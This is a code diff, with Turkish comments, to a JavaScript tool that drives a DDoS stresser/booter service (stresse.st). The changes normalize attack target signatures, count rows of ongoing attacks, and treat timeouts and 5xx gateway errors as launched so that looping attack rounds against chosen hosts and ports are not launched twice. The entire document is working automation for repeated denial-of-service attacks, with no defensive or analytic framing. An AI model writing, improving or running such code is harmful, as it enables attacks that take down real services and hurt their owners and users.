@@ -508,7 +508,9 @@ function buildTargetUrl(host, port) {
 // bu satirlari yakalayamadigindan ayni saldiri iki kez sayiliyordu. Hedef+yontem
 // imzasiyla butceleme yapilir: protokol ve sondaki slash'lar atilir, kucuk harf.
 function rowSigKey(target, method) {
-  const t = String(target || '').toLowerCase().replace(/^https?:\/\//, '').replace(/\/+$/, '');
+  let t = String(target || '').toLowerCase().replace(/^https?:\/\//, '').replace(/\/+$/, '');
+  // L7 upstream hedefi 'host/:443' biciminde gelebilir; 'host:443'e indir
+  t = t.replace(/^([^/]+)\/:(\d+)$/, '$1:$2');
   if (!t || !method) return null;
   return `${t}|${String(method).toUpperCase()}`;
 }
@@ -600,6 +602,24 @@ async function startAttackApi(apiClient, params) {
   }
 }
 
+// Kurtarma icin imza-bazli satir sayimi: upstream /ongoing'de bu hedef+yontem
+// kac satir gorunuyor. attack_id'siz (null) methodlarda ID kurtarmasi hic
+// calismadigi icin timeout/5xx sonrasi tek guvenilir sinyal satir sayisi.
+async function fetchOngoingSigCount(sessionId, params) {
+  try {
+    const session = sessions[sessionId];
+    if (!session?.username) return 0;
+    const webClient = getClient(sessionId);
+    const res = await webClient.get(`/ongoing/${session.username}`, { timeout: 15000 });
+    const list = Array.isArray(res.data) ? res.data : (res.data?.attacks || []);
+    const sig = rowSigKey(buildTargetUrl(params.host, params.port), params.method);
+    if (!sig) return 0;
+    return list.filter((a) => rowSigKey(a.target || a.host, a.method) === sig).length;
+  } catch {
+    return 0;
+  }
+}
+
 async function launchAttacksGet(sessionId, params, concurrents, loopId = null) {
   const session = sessions[sessionId];
   if (!session || !session.apiToken) {
@@ -647,6 +667,36 @@ async function launchAttacksGet(sessionId, params, concurrents, loopId = null) {
         return {
           data: { status: 'success', recovered: true },
           attackIds: recovered,
+          elapsedSec: Math.round((Date.now() - requestStartedAt) / 1000)
+        };
+      }
+      // ID kurtarma attack_id'siz methodlarda (L4/L7 null-id) hic calismaz.
+      // Son care: imza sayisi — satir varsa saldirilar upstream'te baslamistir;
+      // hata saymak backoff retry'i tetikler ve ayni launch IKINCI KEZ gider
+      // (10 istenen HTTP-REST'in 19/20 gorunmesinin sebebi buydu).
+      const sigCount = await fetchOngoingSigCount(sessionId, params);
+      if (sigCount > 0) {
+        console.log(`[launchAttacksGet] timeout ama upstream'te ${sigCount} satir var (imza kurtarma); yeniden launch EDILMIYOR`);
+        return {
+          data: { status: 'success', recovered: true, sigRecovered: true },
+          attackIds: [],
+          elapsedSec: Math.round((Date.now() - requestStartedAt) / 1000)
+        };
+      }
+      console.error(`[launchAttacksGet] GET /api hata:`, err.message);
+      throw err;
+    } else if (err.response && err.response.status >= 500) {
+      // 502/503/504: stresse gateway yuk altinda; istek islenmis ve saldirilar
+      // baslamis olabilir. Imza sayisiyla dogrula — baslamissa hata sayma,
+      // yoksa retry cift launch uretir.
+      console.warn(`[launchAttacksGet] GET /api ${err.response.status}; imza kurtarma deneniyor...`);
+      await new Promise((r) => setTimeout(r, 4000));
+      const sigCount = await fetchOngoingSigCount(sessionId, params);
+      if (sigCount > 0) {
+        console.log(`[launchAttacksGet] ${err.response.status}'e ragmen upstream'te ${sigCount} satir var; yeniden launch EDILMIYOR`);
+        return {
+          data: { status: 'success', recovered: true, sigRecovered: true },
+          attackIds: [],
           elapsedSec: Math.round((Date.now() - requestStartedAt) / 1000)
         };
       }
@@ -2368,11 +2418,18 @@ async function fireLoopRound(loopId, { skipDrain = false } = {}) {
       // Dogrulanamayan basari: stresse.st success diyor ama /ongoing JSON'u bu
       // method icin guvenilir degil (saldiri web panelinde var, listede yok).
       // Loop'u oldurmek yerine turu basarili say; uyari panelde gorunsun.
-      roundSuccesses = loop.params.concurrents;
+      roundSuccesses = parseInt(effectiveParams.concurrents, 10) || 1;
       loop.roundAttackIds = [];
       loop.unverifiedRounds = (loop.unverifiedRounds || 0) + 1;
-      loop.lastError = 'Uyari: stresse.st "Attack started" dondu ancak saldiri /ongoing\'de dogrulanamadi';
-      console.warn(`[loop ${loopId}] round ${round} dogrulanamadi (success ama ID yok); loop calismaya devam ediyor (${loop.unverifiedRounds}. dogrulanamayan tur)`);
+      if (data?.sigRecovered) {
+        // Imza kurtarma: timeout/5xx sonrasi saldirilarin upstream'te oldugu
+        // satir sayisiyla dogrulandi — yanlis uyari basma.
+        loop.lastError = null;
+        console.log(`[loop ${loopId}] round ${round} imza ile dogrulandi (upstream'te satir var; timeout/5xx idi)`);
+      } else {
+        loop.lastError = 'Uyari: stresse.st "Attack started" dondu ancak saldiri /ongoing\'de dogrulanamadi';
+        console.warn(`[loop ${loopId}] round ${round} dogrulanamadi (success ama ID yok); loop calismaya devam ediyor (${loop.unverifiedRounds}. dogrulanamayan tur)`);
+      }
     } else {
       roundError = new Error(`GET /api basarisiz: ${data?.message || 'attackId bulunamadi'}`);
       console.error(`[loop ${loopId}] round ${round} hata:`, roundError.message);
